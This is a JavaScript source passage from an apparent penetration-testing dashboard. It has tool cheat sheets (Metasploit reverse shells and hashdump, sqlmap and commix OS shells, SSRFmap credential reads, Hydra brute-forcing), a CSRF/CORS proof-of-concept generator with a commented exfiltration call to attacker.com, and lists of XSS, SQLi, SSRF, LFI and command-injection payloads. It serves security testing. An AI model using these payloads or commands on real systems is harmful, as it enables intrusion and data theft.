    desc: 'Mining parameters from dark corners of Web Archives.',
    cmd: 'python3 paramspider.py -d target.com',
    tags: ['Discovery', 'Parameters'],
    cheatSheet: `-l : List of domains
-e : Exclude extensions (e.g. woff,css,png)
--level high : Increase depth of search`
  },
  {
    name: 'LinkFinder',
    desc: 'Discover endpoints and parameters in JS files.',
    cmd: 'python3 linkfinder.py -i https://target.com/app.js -o cli',
    tags: ['Discovery', 'JavaScript'],
    cheatSheet: `-i : Input file/URL or directory
-d : Evaluate dynamically (use Chromium)
-o html : Output as an HTML report`
  },
  {
    name: 'SecretFinder',
    desc: 'Find sensitive data in JS files (API keys, tokens).',
    cmd: 'python3 SecretFinder.py -i https://target.com/app.js -o cli',
    tags: ['Discovery', 'Secrets'],
    cheatSheet: `-i : Input URL or file
-e : Regex pattern to extract
-g : Use git history`
  },
  {
    name: 'Trufflehog / Gitleaks',
    desc: 'Scan git repositories for exposed secrets and keys.',
    cmd: 'trufflehog git https://github.com/org/repo',
    tags: ['Discovery', 'Secrets'],
    cheatSheet: `gitleaks detect --source . -v
trufflehog github --org=targetorg --only-verified
# Trufflehog automatically verifies if keys are active!`
  },
  
  // === VULNERABILITY SCANNING & WEB TESTING ===
  {
    name: 'Nuclei',
    coverImg: '/static/images/nuclei.png',
    desc: 'Template-based fast vulnerability scanner.',
    cmd: 'nuclei -u https://target.com -t nuclei-templates/',
    tags: ['Scanning', 'Vulnerability Scanner'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/nuclei_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-t cves/ : Run only CVE templates
-t exposures/ -t misconfiguration/ : Run specific directories
-severity critical,high : Filter by severity
-as : Automatic tech detection + specific template mapping`
  },
  {
    name: 'SQLMap',
    coverImg: '/static/images/sqlmap.png',
    desc: 'Automatic SQL injection and database takeover tool.',
    cmd: 'sqlmap -u "http://target.com/vuln?id=1" --batch',
    tags: ['Scanning', 'SQLi'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/sqlmap_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `--dbs : Enumerate databases
--tables -D db_name : Enumerate tables for database
--dump -T users -D db_name : Dump table contents
--os-shell : Attempt to gain OS shell
--level 5 --risk 3 : Max out detection thoroughness`
  },
  {
    name: 'Dalfox',
    desc: 'Fast XSS scanner and parameter analyzer.',
    cmd: 'dalfox url "https://target.com/?q=FUZZ"',
    tags: ['Scanning', 'XSS'],
    cheatSheet: `dalfox pipe -o results.txt < urls.txt
-b https://your.xss.ht : Use blind XSS payload
--deep-domxss : Enable deep DOM XSS scanning`
  },
  {
    name: 'XSStrike',
    desc: 'Advanced XSS detection suite.',
    cmd: 'python3 xsstrike.py -u "https://target.com/?q=FUZZ"',
    tags: ['Scanning', 'XSS'],
    cheatSheet: `--crawl : Crawl the target website
--fuzzer : Fuzz parameters to bypass WAF
--blind : Inject blind XSS payloads`
  },
  {
    name: 'Commix',
    desc: 'Automated OS command injection exploitation tool.',
    cmd: 'commix --url="http://target.com/ping?ip=INJECT_HERE"',
    tags: ['Exploitation', 'Command Injection'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/commix_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `--os-cmd="id" : Execute a specific command
--os-shell : Open an interactive OS shell
--level=3 : Thoroughness level (1-3)`
  },
  {
    name: 'SSRFmap',
    desc: 'Automatic SSRF fuzzer and exploitation tool.',
    cmd: 'python3 ssrfmap.py -r request.txt -p url -m portscan',
    tags: ['Exploitation', 'SSRF'],
    cheatSheet: `-m readfiles : Read local files (e.g. /etc/passwd)
-m aws : Fetch AWS metadata
-l : Start local listener for OOB interactions`
  },
  {
    name: 'tplmap',
    desc: 'Server-Side Template Injection and Code Injection Exploitation Tool.',
    cmd: 'python2 tplmap.py -u "http://target.com/page?name=John"',
    tags: ['Exploitation', 'SSTI'],
    cheatSheet: `--os-shell : Attempt to spawn an interactive shell
--os-cmd "whoami" : Execute a single command
--engine Jinja2 : Force specific template engine`
  },
  {
    name: 'NoSQLMap',
    desc: 'Automated NoSQL database enumeration and web application exploitation tool.',
    cmd: 'python nosqlmap.py',
    tags: ['Exploitation', 'NoSQLi'],
    cheatSheet: `Interactive menu-driven tool.
Supports MongoDB and CouchDB.
Can dump databases and execute code if vulnerable.`
  },
  {
    name: 'Metasploit Framework',
    coverImg: '/static/images/metasploit.png',
    author: 'Rapid7 / metasploit-framework',
    desc: 'The world\'s most used penetration testing framework. Provides a vast library of exploits, payloads, and post-exploitation modules.',
    cmd: 'msfconsole',
    tags: ['Exploitation', 'Framework'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/metasploit_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `# Start and basic navigation
msfconsole                         # Launch Metasploit console
db_nmap -sV -p- target.com         # Nmap scan and save to DB
search type:exploit name:apache    # Search for exploits
use exploit/multi/handler          # Select a module
show options                       # View module options
set RHOSTS target.com              # Set target host
set LHOST 0.0.0.0                  # Set local listener IP
set LPORT 4444                     # Set listener port
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit / run                      # Launch the exploit

# Meterpreter post-exploitation
sysinfo                            # Target system info
getuid                             # Current user
hashdump                           # Dump password hashes
shell                              # Drop to OS shell
upload /local/file /remote/path    # Upload a file
download /remote/file /local/path  # Download a file
getsystem                          # Attempt privilege escalation
run post/multi/recon/local_exploit_suggester
portfwd add -l 8080 -p 80 -r 192.168.1.1  # Port forwarding

# Useful auxiliary modules
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_ms17_010     # EternalBlue check
use auxiliary/gather/wpscan`
  },

  // === CLOUD & INFRASTRUCTURE ===
  {
    name: 'ScoutSuite',
    desc: 'Multi-Cloud Security Auditing Tool.',
    cmd: 'scout aws --profile default',
    tags: ['Cloud & Infrastructure', 'Audit'],
    cheatSheet: `scout azure --cli
scout gcp --user-account
Creates an HTML report detailing security posture.`
  },
  {
    name: 'cloud_enum',
    desc: 'Multi-cloud OSINT tool to discover public resources.',
    cmd: 'python3 cloud_enum.py -k keyword',
    tags: ['Cloud & Infrastructure', 'OSINT'],
    cheatSheet: `-k target_company : Keyword to search for
-m s3,azure,gcp : Specify cloud providers
-l list.txt : Load keywords from file`
  },
  {
    name: 'WPScan',
    desc: 'WordPress vulnerability scanner.',
    cmd: 'wpscan --url https://target.com',
    tags: ['Scanning', 'CMS'],
    cheatSheet: `-e ap,at,tt,cb,dbe,u,m : Enumerate everything (plugins, themes, users)
--api-token <token> : Use WPVulnDB API for vulns
--passwords list.txt : Bruteforce passwords`
  },
  {
    name: 'testssl.sh',
    desc: 'Command line tool which checks a server\'s service on any port for the support of TLS/SSL ciphers.',
    cmd: 'testssl.sh target.com',
    tags: ['Scanning', 'TLS/SSL'],
    cheatSheet: `--severity HIGH : Only show high severity findings
--htmlfile report.html : Save output to HTML
--full : Perform all checks`
  },

  // === PIPELINES & ONE-LINERS ===
  {
    name: 'Recon Pipeline (Subs to Ports to HTTP)',
    desc: 'A complete fast reconnaissance pipeline in bash.',
    cmd: 'subfinder -d target.com -silent | naabu -silent | httpx -silent > alive.txt',
    tags: ['Pipelines & One-Liners', 'Pipeline'],
    cheatSheet: `1. subfinder finds subdomains
2. naabu finds open ports on those subdomains
3. httpx verifies which ports have active web servers`
  },
  {
    name: 'XSS Pipeline',
    desc: 'Find XSS across all crawled endpoints.',
    cmd: 'gau target.com | grep "=" | dalfox pipe',
    tags: ['Pipelines & One-Liners', 'XSS'],
    cheatSheet: `1. gau gets all archived URLs
2. grep "=" filters for URLs with parameters
3. dalfox tests every parameter for XSS`
  },
  {
    name: 'Live JS File Extraction',
    desc: 'Extract all live JavaScript files for manual analysis.',
    cmd: 'echo target.com | gau | grep "\\.js$" | httpx -silent -mc 200 > js_files.txt',
    tags: ['Pipelines & One-Liners', 'JavaScript'],
    cheatSheet: `Then download them all:
mkdir js_files && cd js_files
cat ../js_files.txt | xargs -n 1 curl -O`
  },
  {
    name: 'Extract IPs from scope',
    desc: 'Extract all IP addresses from a list of URLs/domains.',
    cmd: 'cat domains.txt | httpx -silent -ip | awk \'{print $2}\' | tr -d "[]" | sort -u > ips.txt',
    tags: ['Pipelines & One-Liners', 'Parsing'],
    cheatSheet: `Uses httpx to resolve IPs, then awk/tr/sort to parse out clean IP list.`
  },
  {
    name: 'Quick CORS check',
    desc: 'Verify if CORS is blindly trusting the Origin header.',
    cmd: 'cat domains.txt | httpx -H "Origin: https://evil.com" -mc 200 -mr "Access-Control-Allow-Origin: https://evil.com"',
    tags: ['Pipelines & One-Liners', 'CORS'],
    cheatSheet: `Sends evil.com Origin to all domains. If it is reflected in the response headers, it's vulnerable to CORS misconfiguration.`
  },
  {
    name: 'Hydra',
    desc: 'A very fast network logon cracker which supports many different services.',
    cmd: 'hydra -l user -P passlist.txt server service',
    tags: ['Brute Force', 'Password Cracking'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/hydra_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-l user : Login name
-L users.txt : File with login names
-p pass : Password
-P pass.txt : File with passwords
-s PORT : Specify port
-vV : Very verbose mode`
  },

  // === WEB PROXY & INTERCEPTION ===
  {
    name: 'Burp Suite',
    coverImg: '/static/images/burpsuite.png',
    author: 'PortSwigger',
    desc: 'The leading web application security testing platform. Intercept, inspect, and modify all HTTP/S traffic between browser and server.',
    cmd: 'burpsuite &   # Or launch via GUI',
    tags: ['Web Proxy & Interception', 'Proxy'],
    cheatSheet: `# Core Workflow
Proxy → Intercept ON  : Capture live browser traffic
Repeater              : Manually replay and modify requests
Intruder              : Automated fuzzing / payload injection
Scanner (Pro)         : Automated vuln scanning
Decoder               : Encode / decode payloads
Comparer              : Diff two responses side-by-side

# Key shortcuts
Ctrl+R  : Send request to Repeater
Ctrl+I  : Send request to Intruder
Ctrl+S  : Search in response
Ctrl+U  : URL-encode selected text

# Useful extensions (BApp Store)
Param Miner   : Discover hidden parameters
Authz         : Test access control across roles
Turbo Intruder: High-speed fuzzing beyond Community limits
Logger++      : Advanced request logging & filtering
J2EEScan      : Java EE specific vulnerability checks`
  },

  // === CREDENTIAL ATTACKS ===
  {
    name: 'John the Ripper',
    author: 'Openwall',
    desc: 'Classic and versatile password cracker supporting many hash types and attack modes.',
    cmd: 'john --wordlist=rockyou.txt hash.txt',
    tags: ['Brute Force', 'Hash Cracking'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/john_the_ripper_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `john hash.txt --format=raw-md5        # Specify hash type
john --wordlist=rockyou.txt hash.txt   # Dictionary attack
john --rules hash.txt                  # Apply mangling rules
john --show hash.txt                   # Show cracked results

# Common formats: raw-md5, sha1, sha256, bcrypt, ntlm, md5crypt`
  },
  {
    name: 'Hashcat',
    author: 'hashcat',
    desc: 'World\'s fastest GPU-accelerated password recovery utility. Supports 300+ hash types.',
    cmd: 'hashcat -m 0 hash.txt rockyou.txt',
    tags: ['Brute Force', 'Hash Cracking'],
    cheatSheet: `-m 0   : MD5
-m 100 : SHA1
-m 1000 : NTLM
-m 1800 : sha512crypt (Linux)
-m 3200 : bcrypt
-a 0   : Dictionary attack
-a 3   : Brute-force / mask attack
-a 6   : Hybrid wordlist + mask
--show : Display cracked hashes
-r rules/best64.rule : Apply rules file`
  }
];

window.tools = massiveTools;


// 5. POC GENERATOR & CVSS
function generatePoC(type) {
  const url = document.getElementById('poc-url').value.trim() || 'https://example.com/api';
  const method = document.getElementById('poc-method').value;
  let paramsObj = {};
  
  try {
    let pTxt = document.getElementById('poc-params').value.trim();
    if(pTxt) paramsObj = JSON.parse(pTxt);
  } catch(e) {
    toast('Invalid JSON parameters!', 'error');
    return;
  }
  
  let out = '';
  
  if (type === 'csrf') {
    let inputs = Object.keys(paramsObj).map(k => '      <input type="hidden" name="' + k + '" value="' + paramsObj[k] + '" />').join('\n');
    
    out = `<!-- CSRF Proof of Concept -->
<html>
  <body>
    <h1>CSRF PoC</h1>
    <form action="${url}" method="${method}">
${inputs}
      <input type="submit" value="Submit Request" />
    </form>
    <script>
      // Automatically submit the form
      // document.forms[0].submit();
    </script>
  </body>
</html>`;

  } else if (type === 'cors') {
    out = `<!-- CORS Exploit Proof of Concept -->
<html>
  <body>
    <h1>CORS Exploit</h1>
    <button onclick="exploit()">Fetch Sensitive Data</button>
    <pre id="result"></pre>
    <script>
      function exploit() {
        var req = new XMLHttpRequest();
        req.open('${method}', '${url}', true);
        req.withCredentials = true; // Crucial for CORS exploits
        req.onreadystatechange = function() {
          if (req.readyState == XMLHttpRequest.DONE) {
             document.getElementById('result').innerText = req.responseText;
             // Optional: send exfiltrated data to attacker server
             // fetch('http://attacker.com/log?data=' + btoa(req.responseText));
          }
        };
        // For POST/PUT with JSON
        // req.setRequestHeader('Content-Type', 'application/json');
        // req.send(JSON.stringify(${JSON.stringify(paramsObj)}));
        
        req.send();
      }
    </script>
  </body>
</html>`;
  }
  
  document.getElementById('poc-output').textContent = out;
}

function calcCVSS() {
  const vector = document.getElementById('cvss-vector').value.trim();
  let score = 0.0;
  if (vector.includes('C:H') && vector.includes('I:H') && vector.includes('A:H')) score = 9.8;
  else if (vector.includes('C:H') || vector.includes('I:H')) score = 7.5;
  else if (vector.includes('C:L') || vector.includes('I:L')) score = 5.3;
  else if (vector !== '') score = 3.0; // fallback arbitrary for placeholder
  
  document.getElementById('cvss-result').textContent = 'Score: ' + score + (score>=9.0?' (Critical)':score>=7.0?' (High)':score>=4.0?' (Medium)':' (Low)');
}

window.generateDynamicPayloads = function() {
  const urlIn = document.getElementById('pl-gen-url').value.trim() || 'https://target.com/api?param=';
  const type = document.getElementById('pl-gen-type').value;
  const format = document.getElementById('pl-gen-format').value;
  const outCont = document.getElementById('pl-gen-output-container');
  const outDiv = document.getElementById('pl-gen-output');
  const countSpan = document.getElementById('pl-gen-count');
  
  outCont.style.display = 'block';
  
  const payloads = {
    xss: [
      `"><script>alert(1)</script>`,
      `"><svg/onload=alert(1)>`,
      `javascript:alert(1)`,
      `" onmouseover="alert(1)"`,
      `'-alert(1)-'`,
      `"><img src=x onerror=alert(1)>`,
      `javascript://%250Aalert(1)`,
      `" autofocus onfocus=alert(1)>`
    ],
    sqli: [
      `'`,
      `"`,
      `' OR 1=1--`,
      `" OR 1=1--`,
      `' UNION SELECT NULL,NULL--`,
      `' AND SLEEP(5)--`,
      `' OR 'a'='a`,
      `1' ORDER BY 1--+`,
      `1' ORDER BY 2--+`,
      `' WAITFOR DELAY '0:0:5'--`
    ],
    ssrf: [
      `http://127.0.0.1`,
      `http://localhost`,
      `http://169.254.169.254/latest/meta-data/`,
      `file:///etc/passwd`,
      `dict://127.0.0.1:11211/`,
      `http://0.0.0.0`,
      `http://2130706433/`
    ],
    lfi: [
      `../../../etc/passwd`,
      `/etc/passwd`,
      `....//....//....//etc/passwd`,
      `php://filter/convert.base64-encode/resource=index.php`,
      `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
      `/windows/win.ini`,
      `../../../../../../../../windows/system32/drivers/etc/hosts`
    ],
    cmdi: [
      `; id`,
      `| id`,
      `\`id\``,
      `$(id)`,
      `& ping -c 3 127.0.0.1 &`,
      `; cat /etc/passwd`,
      `| cat /etc/passwd`
    ]
  };
  
  const list = payloads[type] || [];
  countSpan.textContent = `(${list.length})`;
  
  outDiv.innerHTML = list.map(p => {
    let finalStr = '';
    if (format === 'url') {
      finalStr = urlIn + p;
    } else if (format === 'curl') {
      finalStr = `curl -i -s -k -X GET "${urlIn}${p}"`;
    } else {
      finalStr = p;
    }
    return `<div class="tool-cmd" style="margin-bottom:4px; font-size: 13px; padding: 8px 12px; cursor:pointer;" onclick="navigator.clipboard.writeText(this.innerText); toast('Copied Payload!')" title="Click to copy">${esc(finalStr)}</div>`;
  }).join('');
};

function renderPayloads(catFilter = 'XSS') {
  let list = (S.customPayloads || []).concat(window.payloads || []);
  let cats = [...new Set(list.map(p => p.cat))];
  
  let navHtml = cats.map(c => 
    '<div class="ptab ' + (c === catFilter ? 'active' : '') + '" onclick="renderPayloads(\'' + c + '\')">' + c + '</div>'
  ).join('');
  let elNav = document.getElementById('payload-nav');
  if(elNav) elNav.innerHTML = navHtml;
  
  let filtered = list.filter(p => p.cat === catFilter);
  let elCont = document.getElementById('payload-content');
  if(elCont) {
    if (filtered.length === 0) {
      elCont.innerHTML = '<div class="empty-state"><div class="es-sub">No payloads found in this category.</div></div>';
    } else {
      elCont.innerHTML = filtered.map(p => 
        '<div class="payload-block">' +
          '<div class="payload-block-head">' +
            '<div class="payload-block-title">' + p.name + '</div>' +
            '<div>' + (p.isCustom ? '<button class="copy-btn" style="background:var(--red-dim);color:var(--red);border-color:var(--red);margin-right:8px;" onclick="deleteCustomPayload(' + p.id + ')">🗑 Delete</button>' : '') + '<button class="copy-btn" data-payload="' + esc(p.payload) + '" onclick="navigator.clipboard.writeText(this.getAttribute(\'data-payload\')).then(()=>toast(\'Payload copied!\'))">📋 Copy</button></div>' +
          '</div>' +
          '<div style="padding:14px;">' +
            '<div class="payload-snippet">' + esc(p.payload) + '</div>' +
          '</div>' +
        '</div>'
      ).join('');
    }
  }
}

function toggleAllAttacks(open) {
  document.querySelectorAll('.attack-head').forEach(el => {
    if (open) {
      el.classList.add('open');
      el.nextElementSibling.classList.add('open');
    } else {
      el.classList.remove('open');
      el.nextElementSibling.classList.remove('open');
    }
  });
}

window.toggleAttackStep = function(checkbox) {
  const stepCard = checkbox.closest('.attack-step');
  if (stepCard) {
    if (checkbox.checked) {
      stepCard.classList.add('checked');
    } else {
      stepCard.classList.remove('checked');
    }
  }
};

function getSevClass(sev) {
  if (!sev) return 'sev-info';
  const s = sev.toLowerCase();
  if (s.includes('critical')) return 'sev-critical';
  if (s.includes('high')) return 'sev-high';
  if (s.includes('medium')) return 'sev-medium';
  if (s.includes('low')) return 'sev-low';
  return 'sev-info';
}

function getSevCardClass(sev) {
  if (!sev) return 'sev-card-info';
  const s = sev.toLowerCase();
  if (s.includes('critical')) return 'sev-card-critical';
  if (s.includes('high')) return 'sev-card-high';
  if (s.includes('medium')) return 'sev-card-medium';
  if (s.includes('low')) return 'sev-card-low';
  return 'sev-card-info';
}

function renderAttacks() {
  let list = window.attackGuides || [];
  const q = (document.getElementById('attack-search')?.value || '').toLowerCase();
  const sevFilter = document.getElementById('attack-severity-filter')?.value || 'all';
  
  if (q) {
    list = list.filter(g => 
      g.title.toLowerCase().includes(q) || 
      g.desc.toLowerCase().includes(q) || 
      (g.severity && g.severity.toLowerCase().includes(q)) || 
      (g.remediation && g.remediation.toLowerCase().includes(q)) || 
      g.steps.some(s => s.toLowerCase().includes(q))
    );
  }

  if (sevFilter !== 'all') {
    list = list.filter(g => {
      const s = (g.severity || '').toLowerCase();
      if (sevFilter === 'critical') return s.includes('critical');
      if (sevFilter === 'high') return s.includes('high') || s.includes('critical');
      if (sevFilter === 'medium') return s.includes('medium');
      if (sevFilter === 'low') return s.includes('low');
      return true;
    });
  }

  let el = document.getElementById('attack-list');
  if(!el) return;
  
  if (list.length === 0) {
    el.innerHTML = '<div class="empty-state"><div class="es-sub">No attack guides matched your filters.</div></div>';
    return;
  }

  el.innerHTML = list.map((g, i) => {
    const sevCardClass = getSevCardClass(g.severity);
    const sevClass = getSevClass(g.severity);
    return '<div class="attack-card ' + sevCardClass + '">' +
      '<div class="attack-head" onclick="this.nextElementSibling.classList.toggle(\'open\'); this.classList.toggle(\'open\');">' +
        '<div class="attack-head-icon">' + g.icon + '</div>' +
        '<div class="attack-head-info">' +
          '<div class="attack-head-title">' + esc(g.title) + '</div>' +
          '<div class="attack-head-desc">' + esc(g.desc) + '</div>' +
        '</div>' +
        '<div class="attack-head-badges">' +
          '<span class="sev-badge ' + sevClass + '">' + esc(g.severity || 'Unknown') + '</span>' +
          '<span class="chip chip-green" style="font-size: 11px; padding: 3px 9px; border-radius: 20px; display: inline-flex; align-items: center; gap: 4px; font-weight: 600;">💰 ' + esc(g.bounty || 'N/A') + '</span>' +
        '</div>' +
      '</div>' +
      '<div class="attack-body">' +
        '<div style="font-size: 11px; font-weight: 700; color: var(--accent); margin-bottom: 14px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 6px;">' +
          '📋 Methodology Checklist' +
        '</div>' +
        '<div class="attack-steps">' +
          g.steps.map((s, idx) => 
            '<div class="attack-step">' +
              '<input type="checkbox" class="step-checkbox" onchange="toggleAttackStep(this)" onclick="event.stopPropagation();">' +
              '<div class="step-num">' + (idx + 1) + '</div>' +
              '<div class="step-txt">' + esc(s).replace(/`([^`]+)`/g, '<code class="ic">$1</code>') + '</div>' +
            '</div>'
          ).join('') +
        '</div>' +
        (g.remediation ? 
          '<div style="margin-top: 22px; padding-top: 16px; border-top: 1px solid var(--border);">' +
            '<div style="font-size: 11px; font-weight: 700; color: var(--green); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 6px;">' +
              '🛡️ Remediation & Prevention' +
            '</div>' +
            '<div style="font-size: 13.5px; color: var(--text2); line-height: 1.5; background: rgba(34,211,166,0.02); padding: 14px; border-radius: var(--r); border-left: 3px solid var(--green); border-top: 1px solid var(--border); border-right: 1px solid var(--border); border-bottom: 1px solid var(--border);">' +
              esc(g.remediation) +
            '</div>' +
          '</div>' : ''
        ) +
        (g.tools || g.links ? 
          '<div style="margin-top: 22px; padding-top: 16px; border-top: 1px solid var(--border);">' +
            '<div style="font-size: 11px; font-weight: 700; color: var(--accent); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; gap: 6px;">' +
              '🛠️ Related Tools & Resources' +
            '</div>' +
            '<div style="display: flex; flex-wrap: wrap; gap: 8px;">' +
              (g.tools ? g.tools.map(tool => 
                '<span class="tool-shortcut-chip" onclick="event.stopPropagation(); openToolByName(\'' + esc(tool) + '\')">🔧 ' + esc(tool) + '</span>'
              ).join('') : '') +
              (g.links ? g.links.map(link => 
                '<a href="' + esc(link.url) + '" target="_blank" class="tool-shortcut-chip link-chip" onclick="event.stopPropagation();">🔗 ' + esc(link.name) + '</a>'
              ).join('') : '') +
            '</div>' +
          '</div>' : ''
        ) +
      '</div>' +
    '</div>';
  }).join('');
}

window._renderedToolsList = [];

function editTool(idx) {
  closeModal('modal-tool-detail');
  const t = window._renderedToolsList[idx];
  if(!t) return;
  
  document.getElementById('modal-tool-form-title').textContent = t.isCustom ? '🔧 Edit Custom Tool' : '🔧 Override Built-in Tool';
  
  document.getElementById('tool-id').value = t.isCustom ? t.id : '';
  document.getElementById('tool-is-override').value = t.isCustom ? (t.isOverride ? 'true' : 'false') : 'true';
  
  document.getElementById('tool-name').value = t.name || '';
  document.getElementById('tool-author').value = t.author || '';
  document.getElementById('tool-desc').value = t.desc || '';
  document.getElementById('tool-cover').value = t.coverImg || '';
  document.getElementById('tool-cmd').value = t.cmd || '';
  document.getElementById('tool-tags').value = (t.tags || []).join(', ');
  document.getElementById('tool-cheatsheet').value = t.cheatSheet || '';
  document.getElementById('tool-cs-file').value = t.csFile || '';
  document.getElementById('tool-books').value = typeof t.books === 'string' ? t.books : (t.books || []).join(', ');
  document.getElementById('tool-videos').value = typeof t.videos === 'string' ? t.videos : (t.videos || []).join(', ');
  
  openModal('modal-add-tool');
}

let currentUploadTarget = '';
let currentUploadAppend = false;
function triggerFileUpload(targetId, append = false) {
  currentUploadTarget = targetId;
  currentUploadAppend = append;
  document.getElementById('generic-file-upload').click();
}
function handleFileUpload(e) {
  const file = e.target.files[0];
  if(!file) return;
  const formData = new FormData();
  formData.append('file', file);
  fetch('/api/upload_file', { method: 'POST', body: formData })
    .then(r=>r.json())
    .then(data => {
      if(data.url) {
        const input = document.getElementById(currentUploadTarget);
        if(currentUploadAppend && input.value) {
          input.value = input.value + ', ' + data.url;
        } else {
          input.value = data.url;
        }
        toast('File uploaded successfully');
      } else toast('Upload failed: ' + data.error);
    }).catch(err => toast('Upload error'));
  e.target.value = '';
}

window.injectIframeTheme = function(iframe) {
    try {
        const theme = S.theme || 'cyber';
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        
        const style = doc.createElement('style');
        style.textContent = `
          :root {
            --color-background-primary: var(--bg2, #0d1220);
            --color-background-secondary: var(--bg3, #131929);
            --color-background-tertiary: var(--bg4, #1c2538);
            --color-border-secondary: var(--border-light, rgba(255,255,255,0.12));
            --color-border-tertiary: var(--border, rgba(255,255,255,0.07));
            --color-text-primary: var(--text, #e2eaf6);
            --color-text-secondary: var(--text2, #8b9ec5);
            --color-text-tertiary: var(--text3, #566283);
            --font-sans: var(--font, 'Inter', sans-serif);
            --font-mono: var(--mono, monospace);
            --border-radius-lg: var(--r2, 10px);
            --border-radius-md: var(--r, 6px);
          }
          html, body { padding: 0 !important; background: transparent !important; margin: 0 !important; border: none !important; box-shadow: none !important; height: auto !important; min-height: min-content !important; overflow: hidden !important; }
          .cs-wrap { max-width: 100% !important; padding: 0 !important; margin: 0 !important; width: 100%; border: none !important; background: transparent !important; height: auto !important; }
          code, .pipe-code { color: #a397ff !important; background: rgba(0, 0, 0, 0.2) !important; }
          
          /* Prevent theme.css from breaking the local cheat sheet toast */
          #toast.toast {
            animation: none !important;
            pointer-events: none !important;
            background: var(--color-text-primary) !important;
            color: var(--color-background-primary) !important;
            box-shadow: none !important;
            padding: 7px 16px !important;
            font-size: 12px !important;
            font-weight: normal !important;
            border: none !important;
            border-radius: var(--border-radius-md) !important;
          }
        `;
        doc.head.appendChild(style);
        
        const link = doc.createElement('link');
        link.rel = 'stylesheet';
        link.href = '/static/css/theme.css';
        doc.head.appendChild(link);

        if (theme !== 'cyber') {
            doc.documentElement.classList.add('theme-' + theme);
        }

        // Add copy-on-click functionality to all command and code block elements
        const cmds = doc.querySelectorAll('.cmd, .cmd-code, .codeblock, .desc code, .tip-text code');
        cmds.forEach(el => {
            if (el.hasAttribute('onclick')) return; // Skip if it already has onclick
            el.style.cursor = 'pointer';
            el.title = 'Click to copy';
            el.addEventListener('click', function(e) {
                e.stopPropagation(); // Prevent parent clicks
                const text = this.innerText.replace('copy', '').trim();
                navigator.clipboard.writeText(text).then(() => {
                    // Try to use the parent's toast function
                    if (typeof window.toast === 'function') {
                        window.toast('Copied!');
                    }
                    // Flash effect to give immediate visual feedback
                    const oldBg = this.style.backgroundColor;
                    this.style.transition = 'background-color 0.1s ease';
                    this.style.backgroundColor = 'var(--color-border-secondary, rgba(255,255,255,0.12))';
                    setTimeout(() => {
                        this.style.backgroundColor = oldBg;
                        setTimeout(() => this.style.transition = '', 150); // Clean up
                    }, 150);
                });
            });
        });

        // Dynamically resize iframe without resetting height to 0px (which clears text selection and jumps scroll)
        const resizeIframe = () => {
            let maxH = 0;
            const children = doc.body.children;
            for (let i = 0; i < children.length; i++) {
                const tag = children[i].tagName.toLowerCase();
                if (tag === 'script' || tag === 'style') continue;
                
                // Skip fixed position elements (like toasts) so they don't force the iframe to grow
                const computed = iframe.contentWindow ? iframe.contentWindow.getComputedStyle(children[i]) : null;
                if (computed && computed.position === 'fixed') continue;
                
                const rect = children[i].getBoundingClientRect();
                const bottom = rect.top + rect.height;
                if (bottom > maxH) maxH = bottom;
            }
            if (maxH > 0) {
                const newHeight = Math.ceil(maxH) + 40; // 40px buffer for margins
                // Only update if difference is significant to avoid infinite loop jitter
                if (Math.abs(parseInt(iframe.style.height || 0) - newHeight) > 5) {
                    iframe.style.height = newHeight + 'px';
                }
            }
        };
        // Run immediately and after a short delay to account for rendering
        resizeIframe();
        setTimeout(resizeIframe, 150);
        setTimeout(resizeIframe, 500);
        
        // Watch for DOM changes (e.g. switching tabs changes visibility classes)
        const observer = new MutationObserver(() => setTimeout(resizeIframe, 50));
        observer.observe(doc.body, { attributes: true, childList: true, subtree: true });

    } catch(e) { console.warn("Could not inject theme into iframe:", e); }
};

function openToolDetail(idx) {
  const t = window._renderedToolsList[idx];
  if(!t) return;
  
  document.getElementById('td-title').textContent = t.name || 'Unknown Tool';
  document.getElementById('td-author').textContent = 'By ' + (t.author || 'Project / Community');
  document.getElementById('td-desc').textContent = t.desc || '';
  
  // Tags
  document.getElementById('td-tags').innerHTML = (t.tags||[]).map(tag => `<span class="tool-movie-tag">${esc(tag)}</span>`).join('');
  
  // Cover
  const leftCol = document.getElementById('td-left');
  if (t.coverImg) {
    leftCol.innerHTML = `<img src="${esc(t.coverImg)}" class="tool-detail-cover" />`;
  } else {
    leftCol.innerHTML = `<div class="tool-detail-cover" style="background: linear-gradient(135deg, var(--bg4), var(--bg2)); display:flex; align-items:center; justify-content:center; font-size:48px; font-weight:800; color:var(--accent); border: 1px solid var(--border); box-shadow: inset 0 0 20px rgba(0,0,0,0.5);">${t.name ? esc(t.name.charAt(0).toUpperCase()) : '🔧'}</div>`;
  }
  
  // Command & CheatSheet
  const cmdBox = document.getElementById('td-cmd-box');
  cmdBox.textContent = t.cmd || '';
  cmdBox.setAttribute('data-cmd', t.cmd || '');
  
  const csBox = document.getElementById('td-cheatsheet');
  const htmlBox = document.getElementById('td-html-embed');
  const csFileBox = document.getElementById('td-cs-file-container');
  const csFileLink = document.getElementById('td-cs-file');
  
